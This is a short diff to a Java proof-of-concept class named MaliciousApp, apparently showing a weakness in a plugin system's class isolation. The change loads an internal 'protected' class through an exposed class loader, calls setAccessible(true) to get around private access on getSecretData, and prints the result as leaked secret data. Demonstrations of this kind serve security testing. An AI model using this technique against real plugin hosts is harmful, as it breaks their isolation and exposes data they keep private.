@@ -21,7 +21,8 @@ public class MaliciousApp {
 
                 // Now use the loader to manually load a "protected" class
                 Class<?> internalClass = Class.forName("com.plugin.internal.ProtectedResource", true, exposedLoader);
-                Method getSecret = internalClass.getMethod("getSecretData");
+                Method getSecret = internalClass.getDeclaredMethod("getSecretData");
+                getSecret.setAccessible(true); // bypass private access
                 String secret = (String) getSecret.invoke(null);
 
                 System.out.println("[ATTACK] Leaked Secret Data: " + secret);
